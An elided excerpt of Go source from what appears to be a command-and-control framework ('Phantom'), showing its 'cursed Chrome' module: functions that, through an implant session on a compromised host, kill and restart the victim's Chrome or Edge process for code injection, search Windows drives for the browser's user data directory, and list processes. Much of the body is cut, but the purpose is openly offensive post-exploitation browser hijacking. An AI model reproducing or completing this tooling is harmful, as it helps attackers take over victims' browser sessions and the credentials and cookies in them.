...
import (
	...
	"github.com/cryptdefender3232/phantom/client/overlord"
	"github.com/cryptdefender3232/phantom/client/tcpproxy"
...
func CursedChromeCmd(cmd *cobra.Command, con *console.PhantomClient, args []string) {
...
func avadaKedavraChrome(session *clientpb.Session, cmd *cobra.Command, con *console.PhantomClient, cargs []string) *core.CursedProcess {
	...
	if chromeProcess != nil {
		...
		con.PrintWarnf("Phantom will need to kill and restart the Chrome process in order to perform code injection.\n")
		con.PrintWarnf("Phantom will attempt to restore the user's session, however %s\n", console.StyleBold.Render("DATA LOSS MAY OCCUR!"))
		con.Printf("\n")
		confirm := false
		...
		terminateResp, err := con.Rpc.Terminate(context.Background(), &phantompb.TerminateReq{
...
func startCursedChromeProcess(isEdge bool, session *clientpb.Session, cmd *cobra.Command, con *console.PhantomClient, cargs []string) (*core.CursedProcess, error) {
	name := "Chrome"
	if isEdge {
		name = "Edge"
	}
	...
	chromeExec, err := con.Rpc.Execute(context.Background(), &phantompb.ExecuteReq{
		Request: con.ActiveTarget.Request(cmd),
		Path:    chromeExePath,
		Args:    args,
		Output:  false,
...
func findChromeUserDataDir(isEdge bool, session *clientpb.Session, cmd *cobra.Command, con *console.PhantomClient) (string, error) {
	...
	case "windows":
		...
		for _, driveLetter := range windowsDriveLetters {
			...
			ls, err := con.Rpc.Ls(context.Background(), &phantompb.LsReq{
				Request: con.ActiveTarget.Request(cmd),
				Path:    userDataDir,
			})
			if err != nil {
...
func findChromeExecutablePath(isEdge bool, session *clientpb.Session, cmd *cobra.Command, con *console.PhantomClient) (string, error) {
...
func getChromeProcess(session *clientpb.Session, cmd *cobra.Command, con *console.PhantomClient) (*commonpb.Process, error) {
	ps, err := con.Rpc.Ps(context.Background(), &phantompb.PsReq{
		Request: con.ActiveTarget.Request(cmd),
	})
	if err != nil {
		return nil, err
